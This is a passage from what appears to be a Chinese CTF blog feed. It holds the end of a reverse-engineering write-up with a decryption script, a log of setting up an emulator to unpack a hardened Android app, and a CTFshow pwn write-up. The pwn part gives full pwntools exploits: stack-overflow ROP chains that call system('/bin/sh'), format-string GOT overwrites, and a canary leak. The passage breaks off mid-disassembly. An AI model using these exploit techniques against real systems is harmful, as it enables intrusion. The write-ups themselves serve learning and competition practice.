v5;</span><br><span class="line">        ++v10;</span><br><span class="line">        ++v6;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(v3);</span><br><span class="line">        ++v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v5 = v3[v9] - <span class="number">1</span>;</span><br><span class="line">        ++v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v5 = v3[v9] + <span class="number">1</span>;</span><br><span class="line">        ++v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的指令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 读入明文</span></span><br><span class="line">10</span><br><span class="line"><span class="meta">#</span><span class="bash"> 加密开始</span></span><br><span class="line">4, 8, 3, 1, </span><br><span class="line">4, 8, 5, 1, </span><br><span class="line">3, 8, 11, 1,</span><br><span class="line">12, 8, 4, 1,</span><br><span class="line">5, 8, 3, 1,</span><br><span class="line">11, 8, 11, 1,</span><br><span class="line">4, 8, 3, 1,</span><br><span class="line">2, 8, 4, 1,</span><br><span class="line">12, 8, 11, 1,</span><br><span class="line">5, 8, 2, 1,</span><br><span class="line">2, 8, 4, 1,</span><br><span class="line">2, 8, 5, 1,</span><br><span class="line">5, 8, 2, 1, </span><br><span class="line">4, 8, 3, 1,</span><br><span class="line">2, 8, 12, 1,</span><br><span class="line"><span class="meta">#</span><span class="bash"> 校验 15 位密文</span></span><br><span class="line">7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7</span><br></pre></td></tr></table></figure><p>1 是将明文加密后的字符赋值到 v4 ，用于最后校验密文。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>每个字符加密操作，没有用到迭代的中间变量，所以 a1 中的密文提取出来，然后按照各个字符逐个解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">m1&#x3D;(c[0]+5)^0x10</span><br><span class="line">m2&#x3D;(c[1]&#x2F;3)^0x20</span><br><span class="line">m3&#x3D;c[2]+3</span><br><span class="line">m4&#x3D;(c[3]^4)-1</span><br><span class="line">m5&#x3D;(c[4]+0x21)&#x2F;3</span><br><span class="line">m6&#x3D;(c[5]+2)</span><br><span class="line">m7&#x3D;(c[6]+0x20)^9</span><br><span class="line">m8&#x3D;((c[7]^0x24)-0x51)&amp;0xff</span><br><span class="line">m9&#x3D;c[8]</span><br><span class="line">m10&#x3D;((c[9]&amp;0xff)-0x25)&#x2F;2</span><br><span class="line">m11&#x3D;((c[10]^0x41)-0x36)</span><br><span class="line">m12&#x3D;(c[11]-0x20)</span><br><span class="line">m13&#x3D;(c[12]-0x25)&#x2F;3</span><br><span class="line">m14&#x3D;(c[13]+0x20)^9</span><br><span class="line">m15&#x3D;c[14]-0x42</span><br></pre></td></tr></table></figure><p>最后结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">757515121f3d478</span><br></pre></td></tr></table></figure><p>事后发觉如果每个字符都是单独加密的，没有迭代的。可以试试把每一个密码的所有明文对应的密文爆破出来，然后就只需要挑出来对应的明文即可。ascii 可见字符应该是 95 个，每一轮的输入 15 个相同 明文，然后提取加密的字符串，可以实现的。</p><p>听群里老师傅能用 <code>angr</code> 秒。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 网鼎杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020第二届网鼎杯RE-bang脱壳环境踩坑记录</title>
      <link href="archives/6065cbd4/"/>
      <url>archives/6065cbd4/</url>
      
        <content type="html"><![CDATA[<p>承接上文<a href="https://www.mrskye.cn/archives/125/">第二届网鼎杯 Writeup</a>，使用<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a>进行脱壳。作者在 github 上的说明不太详细，就百度找到了<a href="https://www.jianshu.com/p/a27cc752e750">操作向-DexExtractor的使用</a>这篇文章。依据文章和作者的介绍开始配置环境。</p><h2 id="AVD-配置"><a href="#AVD-配置" class="headerlink" title="AVD 配置"></a>AVD 配置</h2><p>DexExtractor 的使用需要替换 sdk 中的<code>system-images\android-19\default\armeabi-v7a\system.img</code>为作者版本，如果需要在其他安卓版本使用，需要自行编译对应版本的<code>system.img</code>。</p><p>有现成轮子就直接用了，<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a>作者编译的<code>system.img</code>是<strong>android 4.4 、api-19</strong>版本。但是 AS API-19 的有三个版本，README 中没指明。<a href="https://www.jianshu.com/p/a27cc752e750">操作向-DexExtractor的使用</a>里面写着用非 google api 版本，就尝试性使用。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-12-QMtoW1sGIvnTv5KO.png"></p><p>创建 AVD 完成后，未修改任何文件，测试虚拟机可用性。提示报错有两条，其中一条是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cannot find avd system path please define android sdk root</span><br></pre></td></tr></table></figure><p>sdk 的系统变量我是配置正确的，重启 AS 错误解决。再次运行报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Emulator: emulator: ERROR: This AVD&#x27;s configuration is missing a kernel file! Please ensure the file &quot;kernel-ranchu&quot; is in the same location as your system image.</span><br><span class="line">Emulator: emulator: ERROR: ANDROID_SDK_ROOT is defined (D:\Android\Sdk) but cannot find kernel file in D:\Android\Sdk\system-images\ sub directories</span><br></pre></td></tr></table></figure><p>报错没有找到 <code>kernel-ranch</code> 内核文件。百度谷歌后有几种解决方法：</p><ol><li><p>将位于<code>Sdk\system-images\android-19\default\armeabi-v7a</code> 的kernel-qemu 重命名为 kernel-ranchu 。</p><p><strong>实测无效</strong>，重命名后报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PANIC: Unknown AVD name [Pixel], use -list-avds to see valid list.</span><br><span class="line">HOME is defined but there is no file Pixel.ini in $HOME\.android\avd</span><br></pre></td></tr></table></figure></li><li><p>将 sdk 镜像下的<code>Sdk\system-images\android-19\default\armeabi-v7a</code> 全部文件复制到 AVD 的目录<code>.android\avd\Pixel_2_API_19_2.avd</code>下。</p><p><strong>实测无效</strong>，报错与复制前一样。</p></li></ol><p>最后在 stackoverflow 找到两篇帖子 <a href="https://stackoverflow.com/questions/9712605/emulator-error-this-avds-configuration-is-missing-a-kernel-file">Emulator error: This AVD’s configuration is missing a kernel file</a>和<a href="https://stackoverflow.com/questions/51897046/mac-and-panic-missing-emulator-engine-program-for-arm-cpu">Mac and “PANIC: Missing emulator engine program for ‘arm’ CPU.”</a>，解决方法：在启动 AVD 时，指定 kernel-qemu 为内核则可以启动。</p><blockquote><p>原文如下：<br>author：shizhen<br>See my answer for the Android Studio environment, Mac and “PANIC: Missing emulator engine program for ‘arm’ CPU.”.</p><p>To solve this problem, you need to specify the -kernel path manually. i.e.</p><p>$ ~/Library/Android/sdk/emulator/emulator  @Galaxy_Nexus_Jelly_Bean_API_16 -kernel ~/Library/Android/sdk/system-images/android-16/default/armeabi-v7a/kernel-qemu<br>Remember to change the emulator name Galaxy_Nexus_Jelly_Bean_API_16 to your own emulator name.</p><p>Below command is to check the emulators available for command line.</p><p>$ ~/Library/Android/sdk/emulator/emulator -list-avds<br>And also, ensure that your emulator path is correct, i.e. the one located at ~/Library/Android/sdk/emulator/</p></blockquote><p>然后查阅 android 官方的<a href="https://developer.android.com/studio/run/emulator-commandline">开发手册</a>，找到关于参数 kernel 的描述：</p><blockquote><p>使用特定的模拟内核。如果您未指定路径，则模拟器将在系统目录中查找。如果您未指定此选项，则默认为 kernel-ranchu。如需了解详情，请参阅 AVD 系统目录。使用 ‑show‑kernel 选项查看内核调试消息。</p></blockquote><p>当没有指定 kernel 参数时就默认使用 kernel-ranchu 。而 armeabi-v7a  里面只有 kernel-qemu 。而如果下载的镜像有 google-api 的标签，则有 kernel-ranchu 。（在同一页文档中也找到 kernel-ranchu 是最新版本的 QEMU 2 模拟器。）</p><p>但是使用镜像带有 google-api 的镜像，没有 dump dex 的 logcat，脱壳不成功。</p><p>手动指定 AVD 的启动内核：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -avd avd_name -kernel kernel-qemu</span><br></pre></td></tr></table></figure><p>报错如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PANIC: Missing emulator engine program for &#x27;arm&#x27; CPU.</span><br></pre></td></tr></table></figure><p>原因可能是 sdk/tools 下缺少某些文件，我的解决方法是将 <code>sdk/emulator</code> 全部文件（夹），复制到 <code>sdk/tools</code>，重名文件都选择替换。</p><p>成功启动 AVD 。</p><h2 id="添加读写权限"><a href="#添加读写权限" class="headerlink" title="添加读写权限"></a>添加读写权限</h2><p>apktools 反编译后，在 AndroidManifest.xml manifest 标签内添加：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>保存后回编译 apk 。</p><h2 id="dump-dex"><a href="#dump-dex" class="headerlink" title="dump dex"></a>dump dex</h2><p>按照<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a> readme 描述当在 logcat 中查看到类似于：(x为包名)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E/dalvikvm(4396): --pacthed-- , /sdcard/xxxxxxxxxxxxxxxxx.dex</span><br></pre></td></tr></table></figure><p>将 dex 文件拷贝到本机，然后用<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a>里面的 Decode.jar 对 dex 解码。</p><p>再用 <a href="https://bitbucket.org/JesusFreke/smali/downloads?tab=downloads">baksmail.jar</a> 将 dex 转 smali 。</p><p>计划设想很美好，但是 apk 怎么都运行不了， 错误提示 no support xxxx 。</p><p>猝~</p><h2 id="梆梆加固脱壳实战文章"><a href="#梆梆加固脱壳实战文章" class="headerlink" title="梆梆加固脱壳实战文章"></a>梆梆加固脱壳实战文章</h2><ul><li><a href="https://segmentfault.com/a/1190000022415728">脱壳再打包某梆梆免费加固APP</a></li><li><a href="https://www.cnblogs.com/jiaoxiake/p/6818786.html">android脱壳之DexExtractor原理分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 网鼎杯 </tag>
            
            <tag> 脱壳 </tag>
            
            <tag> 梆梆加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow 36D杯 Writeup</title>
      <link href="archives/105/"/>
      <url>archives/105/</url>
      
        <content type="html"><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>[scode type=”red”]非洲人怎么开容器都连不上所以 wp 都是本地。</p><p>[/scode]</p><p>[scode type=”green”]看完大佬 wp 了解到远程 docker 会过滤空格，不能使用<code>cat flag</code>，需要改用<code>base64&lt;flag</code>。因此这篇水文没有参考意义，去看大佬的 wp 吧~</p><p>膜拜大佬师傅们的WP：</p><p><a href="http://taqini.space/2020/05/04/ctfshow-36d-pwn-wp">taqini</a></p><p><a href="https://fmyy.pro/2020/05/04/Competition/36DCTF">风沐云烟</a></p><p>[/scode]</p><h3 id="Pwn-签到"><a href="#Pwn-签到" class="headerlink" title="Pwn 签到"></a>Pwn 签到</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：栈溢出</strong></p><p>gets 函数栈溢出，程序只开启 NX 保护。漏洞函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  gets((__int64)&amp;v4, <span class="number">0LL</span>);<span class="comment">//溢出点</span></span><br><span class="line">  system(<span class="string">&quot;echo hello wrold!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序有 system 函数，就 gets 将 /bin/sh 写入到 bss 段，然后再调用。</p><p>**完整 exp **</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;124.156.121.112&quot;,28031)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00000000004004ce</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004006d1</span></span><br><span class="line">start = <span class="number">0x400510</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(ret)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x601069</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x601069</span>) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;hello wrold!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>远程环境过滤了空格等，我非洲人就没有看到过远程长什么样！！！</p></blockquote><p>[/collapse]</p><h3 id="Pwn-MagicString"><a href="#Pwn-MagicString" class="headerlink" title="Pwn_MagicString"></a>Pwn_MagicString</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：栈溢出</strong></p><p>emmm这题和签到题怎么这么雷同，一样的思路，一样的方法。</p><p><strong>完整 exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;124.156.121.112&quot;</span>,<span class="number">28061</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">ret = <span class="number">0x00000000004004d1</span></span><br><span class="line">bss = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> *<span class="number">0x2a8</span><span class="comment"># + p64(ret)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(elf.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;I want a girlfriend!\n&quot;</span>)</span><br><span class="line">p.sendline(payload) </span><br><span class="line"><span class="comment">#p.sendlineafter(&quot;I want a girlfriend!\n&quot;,payload)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>远程环境过滤了空格等，我非洲人就没有看到过远程长什么样！！！</p></blockquote><p>[/collapse]</p><h3 id="Pwn-babyFmtstr"><a href="#Pwn-babyFmtstr" class="headerlink" title="Pwn_babyFmtstr"></a>Pwn_babyFmtstr</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：格式化字符串</strong></p><p>格式化字符串长度不大于 0x32 ，漏洞函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_400D0A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sleep(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input name:&quot;</span>);</span><br><span class="line">  myiput((__int64)&amp;s, <span class="number">0x32</span>uLL);</span><br><span class="line">  v0 = strdup(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>, <span class="number">0x32</span>LL, sleep);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> v0;                                    <span class="comment">// 返回复制字符串的指针地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序中没有 system 和 /bin/sh 字符串，也没有后门函数，需要泄露函数地址。调试后得出：第一个可控字符偏移是<strong>8</strong>，main 返回地址 __libc_start_main 偏移是<strong>25</strong>。</p><p>泄露出地址后还需要 rop 回到 main 进行修改地址。因为格式化字符串长度有限制，所以尽量选择差异较小的 got 修改。main 地址是 <strong>0x400E93</strong> ，刚好与 plt 表前几位相同，所以找那些程序中未运行过但即将运行的函数修改，比如 free 。</p><p>free 未运行过，因此 got.plt 会指向到 plt 表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x602040] free@GLIBC_2.2.5 -&gt; 0x4009d6 (free@plt+6)</span><br></pre></td></tr></table></figure><p>将函数</p><p>所以构造第一条 payload ，将 free got 覆写为 main ，然后泄露出 main 返回地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%3731c%11$hn%25$paaaaaaa&quot;</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br></pre></td></tr></table></figure><p>然后就是对某个函数 got 表覆写然后传 /bin/sh getshell 。我的做法是用第一轮输入覆写 strdup 为 system ，第二轮输入 /bin/sh ，当第二轮输入进行字符串复制 strdup(&amp;s) 时 /bin/sh 被传入 system 。</p><p>所以构造第二条 payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%4148765760c%11$nAAAAAAA&quot;</span> + p64(elf.got[<span class="string">&#x27;strdup&#x27;</span>])</span><br></pre></td></tr></table></figure><p>exp 完全不值得参考，远程网络环境不好还直接 %n 改数据(该打.png)。逐 bit 改的去看看 taqini 大佬的，或者爆破改 onegadget 的风沐云烟大佬。</p><p>[/collapse]</p><h3 id="Pwn-tang"><a href="#Pwn-tang" class="headerlink" title="Pwn_tang"></a>Pwn_tang</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：canary 绕过、格式化字符串</strong></p><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><h5 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h5 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">lookhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">5uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);<span class="comment">//格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串长度在 5 字节，长度不足够修改，而且 got 表也不可写。</p><h5 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  lookhere();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_B80);                             </span><br><span class="line">  read(<span class="number">0</span>, &amp;::buf, <span class="number">0x190</span>uLL);</span><br><span class="line">  lookthere();</span><br><span class="line">  <span class="built_in">puts</span>(asc_BA8);                               </span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x60</span>uLL);<span class="comment">//栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出长度仅可以控制 rip 返回地址。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>格式化字符串漏洞可以泄露内存信息，字符串长度限制 5 字节，但还是可以泄露出 canary 值，从而绕过 canary 保护。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;你怎么了？\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">eval</span>(p.recv(<span class="number">18</span>))</span><br><span class="line">log.success(<span class="string">&quot;canart:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure><p>绕过 canary 之后，就可以利用栈溢出控制程序流程。因为程序没有留后门，溢出空间非常小，就泄露 libc 地址，利用 onegadget getshell 。泄露 libc 地址还是利用格式化字符串漏洞，因此需要 rop 回到 main 。</p><p>main 函数是在 __libc_main_start 被调用，所以从返回地址找到 __libc_main_start 调用地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x555555554ab0                            xor    rbx, qword ptr fs:[0x28]</span><br><span class="line">   0x555555554ab9                            je     0x555555554ac0</span><br><span class="line">    ↓</span><br><span class="line">   0x555555554ac0                            add    rsp, 0x48</span><br><span class="line">  